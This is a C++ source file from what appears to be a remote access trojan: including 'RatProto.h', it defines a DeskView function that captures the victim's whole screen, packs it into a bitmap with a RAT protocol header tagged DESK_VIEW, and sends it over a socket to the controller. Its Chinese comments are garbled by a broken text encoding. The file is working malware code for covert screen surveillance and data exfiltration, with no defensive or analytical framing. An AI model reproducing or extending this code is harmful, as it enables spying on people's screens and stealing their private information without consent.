#include "Header.h"
#include "RatProto.h"
//////////////////////////////////////////////////////////////////////////
//Զ�����沶��
BOOL DeskView(SOCKET sockfd){
	HBITMAP hBitmap = CapScreen();//��ȡ��Ļ��ͼ
	HDC hDC = CreateDC("DISPLAY",NULL,NULL,NULL); //��ɫƽ������ɫ��λ�� = ��ǰ�ֱ�����ÿ��������ռ�ֽ���  
	int iBits = GetDeviceCaps(hDC, BITSPIXEL) *GetDeviceCaps(hDC, PLANES);  
	DeleteDC(hDC);
	WORD   wBitCount;   //λͼ��ÿ��������ռ�ֽ���    
	if (iBits <= 1)
		wBitCount = 1;
	else if (iBits <= 4)
		wBitCount = 4;
	else if (iBits <= 8)
		wBitCount = 8;
	else if (iBits <= 24)
		wBitCount = 24;
	else
		wBitCount = iBits;
	//��ɫ���С�� λͼ�������ֽڴ�С
	DWORD   dwPaletteSize=0;	 
	if (wBitCount <= 8)		
		dwPaletteSize = (1 << wBitCount) *	sizeof(RGBQUAD);	
	
	
	BITMAP  bm;    //λͼ���Խṹ    
	GetObject(hBitmap, sizeof(bm), (LPSTR)&bm);  

	BITMAPINFOHEADER   bi,bi1;    //λͼ��Ϣͷ�ṹ        
	bi.biSize = sizeof(BITMAPINFOHEADER);  
	bi.biWidth= bm.bmWidth;
	bi.biHeight = bm.bmHeight;
	bi.biPlanes= 1;
	bi.biBitCount = wBitCount;
	bi.biCompression = BI_RGB; //û��ѹ��
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter  = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant= 0;
	bi1=bi;
	bi1.biBitCount=24;

	DWORD dwBmBitsSize = ((bm.bmWidth * wBitCount+31)/32) * 4 * bm.bmHeight;    //Ϊλͼ���ݷ����ڴ�
	HANDLE hDib  = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  
	LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;// �����ɫ��
	HANDLE hPal = GetStockObject(DEFAULT_PALETTE);   
	HANDLE  hOldPal=NULL; 
	if (hPal){
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC,(HPALETTE)hPal, FALSE);
		RealizePalette(hDC);
	}
	int nOutputBytes = 0;
	unsigned char *pJpp,*m_pDibBits;
	pJpp = new unsigned char [dwBmBitsSize];
	m_pDibBits = new unsigned char [dwBmBitsSize];
	GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,
		(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);// ��ȡ�õ�ɫ�����µ�����ֵ
	if (hOldPal){//�ָ���ɫ��
		SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
		RealizePalette(hDC);
		ReleaseDC(NULL, hDC);
	}

	BITMAPFILEHEADER   bmfHdr;    //λͼ�ļ�ͷ�ṹ  
	bmfHdr.bfType = 0x4D42;  // "BM"  
	DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;  // ����λͼ�ļ�ͷ
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
	RatProto ratPro;
	ratPro.RatId = DESK_VIEW;
	ratPro.RatLen = sizeof(BITMAPFILEHEADER)+sizeof(RatProto)+dwDIBSize;
	
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));//����Э��ͷ
	SendCmd(sockfd,(char*)(&bmfHdr),sizeof(BITMAPFILEHEADER));//����BMPͷ
	SendCmd(sockfd,(char*)lpbi,dwDIBSize);//����BMP����
	GlobalUnlock(hDib);   //���   
	GlobalFree(hDib);
	delete []pJpp;
	delete []m_pDibBits;
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//��ͼ
HBITMAP CapScreen(){
	HWND hDesk = GetDesktopWindow();//����HWND
	HDC hScreenDC = GetDC(hDesk);//����HDC
	HDC hMemDc = CreateCompatibleDC(hScreenDC);//CreateCompatibleDC����һ����ʱDC
	RECT stRect;
	GetWindowRect(hDesk,&stRect);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,stRect.right-stRect.left,stRect.bottom-stRect.top);
	HGDIOBJ hOldBmp =  SelectObject(hMemDc,hBitmap);
	BitBlt(hMemDc,0,0,stRect.right-stRect.left,stRect.bottom-stRect.top,hScreenDC,stRect.left,stRect.top,SRCCOPY);
	SelectObject(hMemDc,hOldBmp);
	DeleteObject(hMemDc);
	ReleaseDC(hDesk,hScreenDC);
	return hBitmap;
}